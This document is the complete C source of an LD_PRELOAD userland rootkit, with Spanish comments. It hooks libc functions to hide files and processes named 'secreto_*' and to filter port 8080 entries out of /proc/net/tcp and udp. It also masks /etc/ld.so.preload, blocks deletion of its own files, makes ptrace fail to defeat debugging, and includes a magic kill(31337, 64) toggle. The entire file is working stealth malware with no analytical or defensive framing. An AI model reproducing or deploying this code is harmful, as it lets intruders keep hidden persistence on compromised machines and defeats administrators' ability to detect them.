#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <signal.h>
#include <stdatomic.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/ptrace.h>

// CONFIGURACIÓN
#define HIDDEN_PREFIX     "secreto_"
#define HIDDEN_PREFIX_LEN 8
#define HIDDEN_PORT_HEX   "1F90"        /* 8080 decimal en hex para /proc/net  */
#define TOGGLE_PID        31337
#define TOGGLE_SIG        64            /* SIGRTMAX en la mayoría de sistemas   */
#define TOGGLE_FILE       "/tmp/.secreto_off"
#define PRELOAD_PATH      "/etc/ld.so.preload"

// SYSCALLS

#define _RAW_ACCESS(p)   syscall(SYS_faccessat, (long)AT_FDCWD, (p), F_OK, 0)
#define _RAW_OPEN(p,f,m) syscall(SYS_openat, (long)AT_FDCWD, (p), (long)(f), (long)(m))
#define _RAW_UNLINK(p)   syscall(SYS_unlinkat, (long)AT_FDCWD, (p), 0)

// Punteros a función original
typedef struct dirent   *(*t_readdir  )(DIR *);
typedef struct dirent64 *(*t_readdir64)(DIR *);
typedef char          *(*t_fgets    )(char *, int, FILE *);
typedef int            (*t_open     )(const char *, int, ...);
typedef int            (*t_openat   )(int, const char *, int, ...);
typedef FILE          *(*t_fopen    )(const char *, const char *);
typedef FILE          *(*t_fopen64  )(const char *, const char *);
typedef int            (*t_stat     )(const char *, struct stat *);
typedef int            (*t_lstat    )(const char *, struct stat *);
typedef int            (*t_fstatat  )(int, const char *, struct stat *, int);
typedef int            (*t_xstat    )(int, const char *, struct stat *);
typedef int            (*t_lxstat   )(int, const char *, struct stat *);
typedef int            (*t_fxstatat )(int, int, const char *, struct stat *, int);
typedef int            (*t_access   )(const char *, int);
typedef int            (*t_faccessat)(int, const char *, int, int);
typedef int            (*t_unlink   )(const char *);
typedef int            (*t_unlinkat )(int, const char *, int);
typedef int            (*t_rename   )(const char *, const char *);
typedef ssize_t        (*t_read     )(int, void *, size_t);
typedef int            (*t_close    )(int);
// Solo compilar si el kernel lo soporta (__NR_statx disponible desde 4.11). */
#ifdef __NR_statx
typedef int            (*t_statx    )(int, const char *, int,
                                      unsigned int, struct statx *);
#endif
#ifdef __GLIBC__
typedef long (*t_ptrace)(enum __ptrace_request, ...);
#else
typedef long (*t_ptrace)(int, ...);
#endif
typedef int            (*t_kill     )(pid_t, int);

/* ── CACHÉ DE FUNCIONES ORIGINALES ─────────────────────────────────────────── */
static t_readdir    _o_readdir;
static t_readdir64  _o_readdir64;
static t_fgets      _o_fgets;
static t_open       _o_open;
static t_openat     _o_openat;
static t_fopen      _o_fopen;
static t_fopen64    _o_fopen64;
static t_stat       _o_stat;
static t_lstat      _o_lstat;
static t_fstatat    _o_fstatat;
static t_xstat      _o_xstat;
static t_lxstat     _o_lxstat;
static t_fxstatat   _o_fxstatat;
static t_access     _o_access;
static t_faccessat  _o_faccessat;
static t_unlink     _o_unlink;
static t_unlinkat   _o_unlinkat;
static t_rename     _o_rename;
static t_read       _o_read;
static t_close      _o_close;
#ifdef __NR_statx
static t_statx      _o_statx;
#endif
static t_ptrace     _o_ptrace;
static t_kill       _o_kill;

static int _hooks_activos = 0;

#define PROC_NET_FD_MAX 32
static int        _pn_fds[PROC_NET_FD_MAX];
static atomic_int _pn_count;

static int es_proc_net(const char *path) {
    return path &&
           (strncmp(path, "/proc/net/tcp", 13) == 0 ||
            strncmp(path, "/proc/net/udp", 13) == 0);
}
static void pn_add(int fd) {
    for (int i = 0; i < PROC_NET_FD_MAX; i++) {
        if (_pn_fds[i] < 0) {
            _pn_fds[i] = fd;
            atomic_fetch_add(&_pn_count, 1);
            break;
        }
    }
}
static void pn_remove(int fd) {
    if (!atomic_load(&_pn_count)) return;
    for (int i = 0; i < PROC_NET_FD_MAX; i++) {
        if (_pn_fds[i] == fd) {
            _pn_fds[i] = -1;
            atomic_fetch_sub(&_pn_count, 1);
            break;
        }
    }
}
static int pn_check(int fd) {
    if (!atomic_load(&_pn_count)) return 0;
    for (int i = 0; i < PROC_NET_FD_MAX; i++) {
        if (_pn_fds[i] == fd) return 1;
    }
    return 0;
}

// Funciones de ayuda
static int rootkit_activo(void) {
    int saved = errno;
    long r = _RAW_ACCESS(TOGGLE_FILE);
    errno = saved;
    return (r != 0);
}

static int es_oculto(const char *name) {
    return name && strncmp(name, HIDDEN_PREFIX, HIDDEN_PREFIX_LEN) == 0;
}

static const char *base_name(const char *path) {
    const char *p = strrchr(path, '/');
    return p ? p + 1 : path;
}

static int path_oculto(const char *path) {
    return path && es_oculto(base_name(path));
}

static int pid_oculto(const char *pid_str) {
    char cp[64];
    snprintf(cp, sizeof(cp), "/proc/%s/comm", pid_str);
    long fd = _RAW_OPEN(cp, O_RDONLY, 0);
    if (fd < 0) return 0;
    char comm[256] = {0};
    syscall(SYS_read, fd, comm, (long)(sizeof(comm) - 1));
    syscall(SYS_close, fd);
    char *nl = strchr(comm, '\n');
    if (nl) *nl = '\0';
    return es_oculto(comm);
}

static int linea_red_oculta(const char *line) {
    return strstr(line, ":" HIDDEN_PORT_HEX " ") != NULL
        || strstr(line, ":1f90 ")                != NULL;
}


// Daemons de systemd (udevd, journald, etc.) tienen loginuid = 4294967295  
static int _es_proceso_usuario(void) {
    char buf[32];
    long fd = _RAW_OPEN("/proc/self/loginuid", O_RDONLY, 0);
    if (fd < 0) return 0;   /* sin /proc → contexto de sistema */
    long n = syscall(SYS_read, fd, buf, (long)(sizeof(buf) - 1));
    syscall(SYS_close, fd);
    if (n <= 0) return 0;
    buf[n] = '\0';
    unsigned long uid = 0;
    int i;
    for (i = 0; buf[i] >= '0' && buf[i] <= '9'; i++)
        uid = uid * 10 + (unsigned long)(buf[i] - '0');
    // 4294967295 == (uint32_t)-1 == sin sesión de audit == daemon de sistema
    return (uid != 4294967295UL);
}

__attribute__((constructor))
static void init_secreto(void) {
    _o_readdir   = (t_readdir)    dlsym(RTLD_NEXT, "readdir");
    _o_readdir64 = (t_readdir64)  dlsym(RTLD_NEXT, "readdir64");
    _o_fgets     = (t_fgets)      dlsym(RTLD_NEXT, "fgets");
    _o_open      = (t_open)       dlsym(RTLD_NEXT, "open");
    _o_openat    = (t_openat)     dlsym(RTLD_NEXT, "openat");
    _o_fopen     = (t_fopen)      dlsym(RTLD_NEXT, "fopen");
    _o_fopen64   = (t_fopen64)    dlsym(RTLD_NEXT, "fopen64");
    _o_stat      = (t_stat)       dlsym(RTLD_NEXT, "stat");
    _o_lstat     = (t_lstat)      dlsym(RTLD_NEXT, "lstat");
    _o_fstatat   = (t_fstatat)    dlsym(RTLD_NEXT, "fstatat");
    _o_xstat     = (t_xstat)      dlsym(RTLD_NEXT, "__xstat");
    _o_lxstat    = (t_lxstat)     dlsym(RTLD_NEXT, "__lxstat");
    _o_fxstatat  = (t_fxstatat)   dlsym(RTLD_NEXT, "__fxstatat");
    _o_access    = (t_access)     dlsym(RTLD_NEXT, "access");
    _o_faccessat = (t_faccessat)  dlsym(RTLD_NEXT, "faccessat");
    _o_unlink    = (t_unlink)     dlsym(RTLD_NEXT, "unlink");
    _o_unlinkat  = (t_unlinkat)   dlsym(RTLD_NEXT, "unlinkat");
    _o_rename    = (t_rename)     dlsym(RTLD_NEXT, "rename");
    _o_read      = (t_read)       dlsym(RTLD_NEXT, "read");
    _o_close     = (t_close)      dlsym(RTLD_NEXT, "close");
#ifdef __NR_statx
    _o_statx     = (t_statx)      dlsym(RTLD_NEXT, "statx");
#endif
    _o_ptrace    = (t_ptrace)     dlsym(RTLD_NEXT, "ptrace");
    _o_kill      = (t_kill)       dlsym(RTLD_NEXT, "kill");

    for (int i = 0; i < PROC_NET_FD_MAX; i++) _pn_fds[i] = -1;
    atomic_store(&_pn_count, 0);

    if (_es_proceso_usuario())
        _hooks_activos = 1;
}

//Hooks

struct dirent *readdir(DIR *dirp) {
    if (!_o_readdir) return NULL;
    if (!_hooks_activos) return _o_readdir(dirp);
    struct dirent *e;
    while ((e = _o_readdir(dirp)) != NULL) {
        if (!rootkit_activo()) break;
        if (es_oculto(e->d_name)) continue;
        if (e->d_name[0] >= '1' && e->d_name[0] <= '9'
            && pid_oculto(e->d_name)) continue;
        break;
    }
    return e;
}

struct dirent64 *readdir64(DIR *dirp) {
    if (!_o_readdir64) return NULL;
    if (!_hooks_activos) return _o_readdir64(dirp);
    struct dirent64 *e;
    while ((e = _o_readdir64(dirp)) != NULL) {
        if (!rootkit_activo()) break;
        if (es_oculto(e->d_name)) continue;
        if (e->d_name[0] >= '1' && e->d_name[0] <= '9'
            && pid_oculto(e->d_name)) continue;
        break;
    }
    return e;
}

char *fgets(char *s, int size, FILE *stream) {
    if (!_o_fgets) return NULL;
    if (!_hooks_activos || !rootkit_activo()) return _o_fgets(s, size, stream);
    char *r;
    while ((r = _o_fgets(s, size, stream)) != NULL) {
        if (!linea_red_oculta(r)) break;
    }
    return r;
}

int open(const char *path, int flags, ...) {
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap; va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
    }
    const char *real = path; 
    if (_hooks_activos && rootkit_activo() && strcmp(path, PRELOAD_PATH) == 0)
        path = "/dev/null";
    if (!_o_open) { errno = ENOSYS; return -1; }
    int fd = (flags & O_CREAT) ? _o_open(path, flags, mode) : _o_open(path, flags);
    if (fd >= 0 && _hooks_activos && rootkit_activo() && es_proc_net(real)) pn_add(fd);
    return fd;
}

int openat(int dfd, const char *path, int flags, ...) {
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap; va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
    }
    const char *real = path;
    if (_hooks_activos && rootkit_activo() && strcmp(path, PRELOAD_PATH) == 0)
        path = "/dev/null";
    if (!_o_openat) { errno = ENOSYS; return -1; }
    int fd = (flags & O_CREAT) ? _o_openat(dfd, path, flags, mode)
                               : _o_openat(dfd, path, flags);
    if (fd >= 0 && _hooks_activos && rootkit_activo() && es_proc_net(real)) pn_add(fd);
    return fd;
}

FILE *fopen(const char *path, const char *mode) {
    if (_hooks_activos && rootkit_activo() && path && strcmp(path, PRELOAD_PATH) == 0)
        path = "/dev/null";
    if (!_o_fopen) return NULL;
    return _o_fopen(path, mode);
}

FILE *fopen64(const char *path, const char *mode) {
    if (_hooks_activos && rootkit_activo() && path && strcmp(path, PRELOAD_PATH) == 0)
        path = "/dev/null";
    if (_o_fopen64) return _o_fopen64(path, mode);
    if (_o_fopen)   return _o_fopen(path, mode);
    return NULL;
}

int stat(const char *path, struct stat *buf) {
    if (_hooks_activos && rootkit_activo() && path_oculto(path)) { errno = ENOENT; return -1; }
    if (_o_stat)    return _o_stat(path, buf);
    if (_o_fstatat) return _o_fstatat(AT_FDCWD, path, buf, 0);
    errno = ENOSYS; return -1;
}

int lstat(const char *path, struct stat *buf) {
    if (_hooks_activos && rootkit_activo() && path_oculto(path)) { errno = ENOENT; return -1; }
    if (_o_lstat)   return _o_lstat(path, buf);
    if (_o_fstatat) return _o_fstatat(AT_FDCWD, path, buf, AT_SYMLINK_NOFOLLOW);
    errno = ENOSYS; return -1;
}

int fstatat(int dfd, const char *path, struct stat *buf, int flags) {
    if (_hooks_activos && rootkit_activo() && path_oculto(path)) { errno = ENOENT; return -1; }
    if (!_o_fstatat) { errno = ENOSYS; return -1; }
    return _o_fstatat(dfd, path, buf, flags);
}

int __xstat(int ver, const char *path, struct stat *buf) {
    if (_hooks_activos && rootkit_activo() && path_oculto(path)) { errno = ENOENT; return -1; }
    if (_o_xstat) return _o_xstat(ver, path, buf);
    errno = ENOSYS; return -1;
}

int __lxstat(int ver, const char *path, struct stat *buf) {
    if (_hooks_activos && rootkit_activo() && path_oculto(path)) { errno = ENOENT; return -1; }
    if (_o_lxstat) return _o_lxstat(ver, path, buf);
    errno = ENOSYS; return -1;
}

int __fxstatat(int ver, int dfd, const char *path, struct stat *buf, int flags) {
    if (_hooks_activos && rootkit_activo() && path_oculto(path)) { errno = ENOENT; return -1; }
    if (_o_fxstatat) return _o_fxstatat(ver, dfd, path, buf, flags);
    errno = ENOSYS; return -1;
}

int access(const char *path, int mode) {
    if (_hooks_activos && rootkit_activo() && path_oculto(path)) { errno = ENOENT; return -1; }
    if (!_o_access) { errno = ENOSYS; return -1; }
    return _o_access(path, mode);
}

int faccessat(int dfd, const char *path, int mode, int flags) {
    if (_hooks_activos && rootkit_activo() && path_oculto(path)) { errno = ENOENT; return -1; }
    if (!_o_faccessat) { errno = ENOSYS; return -1; }
    return _o_faccessat(dfd, path, mode, flags);
}

// Imppedir borrar ficheros "secreto_*" y /etc/ld.so.preload

int unlink(const char *path) {
    if (_hooks_activos && rootkit_activo()
        && (strcmp(path, PRELOAD_PATH) == 0 || path_oculto(path))) {
        errno = ENOENT; return -1;
    }
    if (!_o_unlink) { errno = ENOSYS; return -1; }
    return _o_unlink(path);
}

int unlinkat(int dfd, const char *path, int flags) {
    if (_hooks_activos && rootkit_activo()
        && (strcmp(path, PRELOAD_PATH) == 0 || path_oculto(path))) {
        errno = ENOENT; return -1;
    }
    if (!_o_unlinkat) { errno = ENOSYS; return -1; }
    return _o_unlinkat(dfd, path, flags);
}
int rename(const char *oldpath, const char *newpath) {
    if (_hooks_activos && rootkit_activo() && oldpath
        && (path_oculto(oldpath) || strcmp(oldpath, PRELOAD_PATH) == 0)) {
        errno = ENOENT; return -1;
    }
    if (!_o_rename) { errno = ENOSYS; return -1; }
    return _o_rename(oldpath, newpath);
}

#ifdef __GLIBC__
long ptrace(enum __ptrace_request request, ...) {
#else
long ptrace(int request, ...) {
#endif
    if (_hooks_activos && rootkit_activo()) { errno = EPERM; return -1L; }
    if (!_o_ptrace)       { errno = ENOSYS; return -1L; }
    va_list ap; va_start(ap, request);
    pid_t  pid  = va_arg(ap, pid_t);
    void  *addr = va_arg(ap, void *);
    void  *data = va_arg(ap, void *);
    va_end(ap);
    return _o_ptrace(request, pid, addr, data);
}

int close(int fd) {
    if (!_hooks_activos) {
        if (_o_close) return _o_close(fd);
        return (int)syscall(SYS_close, (long)fd);
    }
    pn_remove(fd);
    if (_o_close) return _o_close(fd);
    return (int)syscall(SYS_close, (long)fd);
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!_o_read) { errno = ENOSYS; return -1; }
    ssize_t ret = _o_read(fd, buf, count);

    if (ret <= 0 || !_hooks_activos || !atomic_load(&_pn_count) || !rootkit_activo()) return ret;
    if (!pn_check(fd)) return ret;

    char *p     = (char *)buf;
    char *endp  = p + ret;
    char *out   = p;

    while (p < endp) {
        char *nl = (char *)memchr(p, '\n', (size_t)(endp - p));
        char *line_end = nl ? nl + 1 : endp;
        size_t line_len = (size_t)(line_end - p);

        int hide = 0;
        for (char *s = p; s + 5 < line_end; s++) {
            if (s[0] == ':' &&
                ((s[1]=='1'&&s[2]=='F'&&s[3]=='9'&&s[4]=='0') ||
                 (s[1]=='1'&&s[2]=='f'&&s[3]=='9'&&s[4]=='0')) &&
                (s[5]==' '||s[5]=='\t'||s[5]=='\n'||s[5]=='\r')) {
                hide = 1; break;
            }
        }
        if (!hide) {
            if (out != p) memmove(out, p, line_len);
            out += line_len;
        }
        p = line_end;
    }
    return (ssize_t)(out - (char *)buf);
}

#ifdef __NR_statx
int statx(int dfd, const char *path, int flags,
          unsigned int mask, struct statx *buf) {
    if (_hooks_activos && rootkit_activo() && path_oculto(path)) { errno = ENOENT; return -1; }
    if (_o_statx) return _o_statx(dfd, path, flags, mask, buf);
    /* Fallback al syscall directo si dlsym no encontró el símbolo */
    long r = syscall(SYS_statx, (long)dfd, path, (long)flags,
                     (unsigned long)mask, buf);
    if (r < 0) { errno = -(int)r; return -1; }
    return 0;
}
#endif

int kill(pid_t pid, int sig) {
    if (!_hooks_activos) {
        if (!_o_kill) { errno = ENOSYS; return -1; }
        return _o_kill(pid, sig);
    }
    if (pid == TOGGLE_PID && sig == TOGGLE_SIG) {
        if (rootkit_activo()) {
            long fd = _RAW_OPEN(TOGGLE_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0600);
            if (fd >= 0) syscall(SYS_close, fd);
        } else {
            _RAW_UNLINK(TOGGLE_FILE);
        }
        return 0;
    }
    if (!_o_kill) { errno = ENOSYS; return -1; }
    return _o_kill(pid, sig);
}
